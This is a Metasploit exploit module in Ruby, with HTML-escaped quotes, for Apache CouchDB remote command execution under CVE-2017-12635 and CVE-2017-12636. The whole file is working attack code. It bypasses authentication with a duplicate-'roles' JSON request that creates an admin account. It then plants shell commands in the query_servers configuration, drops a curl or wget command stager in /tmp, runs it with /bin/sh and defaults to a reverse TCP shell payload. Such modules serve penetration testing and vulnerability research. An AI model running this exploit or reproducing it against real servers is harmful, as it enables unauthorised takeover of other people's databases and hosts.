# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache CouchDB Arbitrary Command Execution&#039;,
      &#039;Description&#039;    => %q{
        CouchDB administrative users can configure the database server via HTTP(S).
        Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB.
        This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user,
        including downloading and executing scripts from the public internet.
      },
      &#039;Author&#039; => [
        &#039;Max Justicz&#039;,                        # CVE-2017-12635 Vulnerability discovery
        &#039;Joan Touzet&#039;,                        # CVE-2017-12636 Vulnerability discovery
        &#039;Green-m  <greenm.xxoo[at]gmail.com>&#039; # Metasploit module
      ],
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2017-12636&#039;],
        [&#039;CVE&#039;, &#039;2017-12635&#039;],
        [&#039;URL&#039;, &#039;https://justi.cz/security/2017/11/14/couchdb-rce-npm.html&#039;],
        [&#039;URL&#039;, &#039;http://docs.couchdb.org/en/latest/cve/2017-12636.html&#039;],
        [&#039;URL&#039;, &#039;https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Apr 6 2016&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; => {
        &#039;PAYLOAD&#039; => &#039;linux/x64/shell_reverse_tcp&#039;,
        &#039;CMDSTAGER::FLAVOR&#039; => &#039;curl&#039;
      },
      &#039;CmdStagerFlavor&#039; => [&#039;curl&#039;, &#039;wget&#039;],
      &#039;Targets&#039; => [
        [&#039;Automatic&#039;,                  {}],
        [&#039;Apache CouchDB version 1.x&#039;, {}],
        [&#039;Apache CouchDB version 2.x&#039;, {}]
      ],
      &#039;DefaultTarget&#039; => 0
    ))

    register_options([
      Opt::RPORT(5984),
      OptString.new(&#039;URIPATH&#039;, [false, &#039;The URI to use for this exploit to download and execute. (default is random)&#039;]),
      OptString.new(&#039;HttpUsername&#039;, [false, &#039;The username to login as&#039;]),
      OptString.new(&#039;HttpPassword&#039;, [false, &#039;The password to login with&#039;])
    ])

    register_advanced_options([
      OptInt.new(&#039;Attempts&#039;, [false, &#039;The number of attempts to execute the payload.&#039;]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory to write temporary payload on disk.&#039;, &#039;/tmp&#039;])
    ])
  end

  def check
    get_version
    version = Gem::Version.new(@version)
    return CheckCode::Unknown if version.version.empty?
    vprint_status "Found CouchDB version #{version}"

    return CheckCode::Appears if version < Gem::Version.new(&#039;1.7.0&#039;) || version.between?(Gem::Version.new(&#039;2.0.0&#039;), Gem::Version.new(&#039;2.1.0&#039;))

    CheckCode::Safe
  end

  def exploit
    fail_with(Failure::Unknown, "Something went horribly wrong and we couldn&#039;t continue to exploit.") unless get_version
    version = @version

    vprint_good("#{peer} - Authorization bypass successful") if auth_bypass

    print_status("Generating #{datastore[&#039;CMDSTAGER::FLAVOR&#039;]} command stager")
    @cmdstager = generate_cmdstager(
      temp: datastore[&#039;WritableDir&#039;],
      file: File.basename(cmdstager_path)
    ).join(&#039;;&#039;)

    register_file_for_cleanup(cmdstager_path)

    if !datastore[&#039;Attempts&#039;] || datastore[&#039;Attempts&#039;] <= 0
      attempts = 1
    else
      attempts = datastore[&#039;Attempts&#039;]
    end

    attempts.times do |i|
      print_status("#{peer} - The #{i + 1} time to exploit")
      send_payload(version)
      Rex.sleep(5)
      # break if we get the shell
      break if session_created?
    end
  end

  # CVE-2017-12635
  # The JSON parser differences result in behaviour that if two &#039;roles&#039; keys are available in the JSON,
  # the second one will be used for authorising the document write, but the first &#039;roles&#039; key is used for subsequent authorization
  # for the newly created user.
  def auth_bypass
    username = datastore[&#039;HttpUsername&#039;] || Rex::Text.rand_text_alpha_lower(4..12)
    password = datastore[&#039;HttpPassword&#039;] || Rex::Text.rand_text_alpha_lower(4..12)
    @auth = basic_auth(username, password)

    res = send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/_users/org.couchdb.user:#{username}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;ctype&#039;         => &#039;application/json&#039;,
      &#039;data&#039;          => %({"type": "user","name": "#{username}","roles": ["_admin"],"roles": [],"password": "#{password}"})
    )

    if res && (res.code == 200 || res.code == 201) && res.get_json_document[&#039;ok&#039;]
      return true
    else
      return false
    end
  end

  def get_version
    @version = nil

    begin
      res = send_request_cgi(
        &#039;uri&#039;           => normalize_uri(target_uri.path),
        &#039;method&#039;        => &#039;GET&#039;,
        &#039;authorization&#039; => @auth
      )
    rescue Rex::ConnectionError
      vprint_bad("#{peer} - Connection failed")
      return false
    end

    unless res
      vprint_bad("#{peer} - No response, check if it is CouchDB. ")
      return false
    end

    if res && res.code == 401
      print_bad("#{peer} - Authentication required.")
      return false
    end

    if res && res.code == 200
      res_json = res.get_json_document

      if res_json.empty?
        vprint_bad("#{peer} - Cannot parse the response, seems like it&#039;s not CouchDB.")
        return false
      end

      @version = res_json[&#039;version&#039;] if res_json[&#039;version&#039;]
      return true
    end

    vprint_warning("#{peer} - Version not found")
    return true
  end

  def send_payload(version)
    vprint_status("#{peer} - CouchDB version is #{version}") if version

    version = Gem::Version.new(@version)
    if version.version.empty?
      vprint_warning("#{peer} - Cannot retrieve the version of CouchDB.")
      # if target set Automatic, exploit failed.
      if target == targets[0]
        fail_with(Failure::NoTarget, "#{peer} - Couldn&#039;t retrieve the version automaticly, set the target manually and try again.")
      elsif target == targets[1]
        payload1
      elsif target == targets[2]
        payload2
      end
    elsif version < Gem::Version.new(&#039;1.7.0&#039;)
      payload1
    elsif version.between?(Gem::Version.new(&#039;2.0.0&#039;), Gem::Version.new(&#039;2.1.0&#039;))
      payload2
    elsif version >= Gem::Version.new(&#039;1.7.0&#039;) || Gem::Version.new(&#039;2.1.0&#039;)
      fail_with(Failure::NotVulnerable, "#{peer} - The target is not vulnerable.")
    end
  end

  # Exploit with multi requests
  # payload1 is for the version of couchdb below 1.7.0
  def payload1
    rand_cmd1 = Rex::Text.rand_text_alpha_lower(4..12)
    rand_cmd2 = Rex::Text.rand_text_alpha_lower(4..12)
    rand_db = Rex::Text.rand_text_alpha_lower(4..12)
    rand_doc = Rex::Text.rand_text_alpha_lower(4..12)
    rand_hex = Rex::Text.rand_text_hex(32)
    rand_file = "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha_lower(8..16)}"

    register_file_for_cleanup(rand_file)

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/_config/query_servers/#{rand_cmd1}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;data&#039;          => %("echo &#039;#{@cmdstager}&#039; > #{rand_file}")
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}/#{rand_doc}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;data&#039;          => %({"_id": "#{rand_hex}"})
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}/_temp_view?limit=20"),
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;authorization&#039; => @auth,
      &#039;ctype&#039;         => &#039;application/json&#039;,
      &#039;data&#039;          => %({"language":"#{rand_cmd1}","map":""})
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/_config/query_servers/#{rand_cmd2}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;data&#039;          => %("/bin/sh #{rand_file}")
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}/_temp_view?limit=20"),
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;authorization&#039; => @auth,
      &#039;ctype&#039;         => &#039;application/json&#039;,
      &#039;data&#039;          => %({"language":"#{rand_cmd2}","map":""})
    )
  end

  # payload2 is for the version of couchdb below 2.1.1
  def payload2
    rand_cmd1 = Rex::Text.rand_text_alpha_lower(4..12)
    rand_cmd2 = Rex::Text.rand_text_alpha_lower(4..12)
    rand_db = Rex::Text.rand_text_alpha_lower(4..12)
    rand_doc = Rex::Text.rand_text_alpha_lower(4..12)
    rand_tmp = Rex::Text.rand_text_alpha_lower(4..12)
    rand_hex = Rex::Text.rand_text_hex(32)
    rand_file = "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha_lower(8..16)}"

    register_file_for_cleanup(rand_file)

    res = send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/_membership"),
      &#039;method&#039;        => &#039;GET&#039;,
      &#039;authorization&#039; => @auth
    )

    node = res.get_json_document[&#039;all_nodes&#039;][0]

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/_node/#{node}/_config/query_servers/#{rand_cmd1}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;data&#039;          => %("echo &#039;#{@cmdstager}&#039; > #{rand_file}")
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}/#{rand_doc}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;data&#039;          => %({"_id": "#{rand_hex}"})
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}/_design/#{rand_tmp}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;ctype&#039;         => &#039;application/json&#039;,
      &#039;data&#039;          => %({"_id":"_design/#{rand_tmp}","views":{"#{rand_db}":{"map":""} },"language":"#{rand_cmd1}"})
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/_node/#{node}/_config/query_servers/#{rand_cmd2}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;data&#039;          => %("/bin/sh #{rand_file}")
    )

    send_request_cgi(
      &#039;uri&#039;           => normalize_uri(target_uri.path, "/#{rand_db}/_design/#{rand_tmp}"),
      &#039;method&#039;        => &#039;PUT&#039;,
      &#039;authorization&#039; => @auth,
      &#039;ctype&#039;         => &#039;application/json&#039;,
      &#039;data&#039;          => %({"_id":"_design/#{rand_tmp}","views":{"#{rand_db}":{"map":""} },"language":"#{rand_cmd2}"})
    )
  end

  def cmdstager_path
    @cmdstager_path ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha_lower(8)}"
  end

end

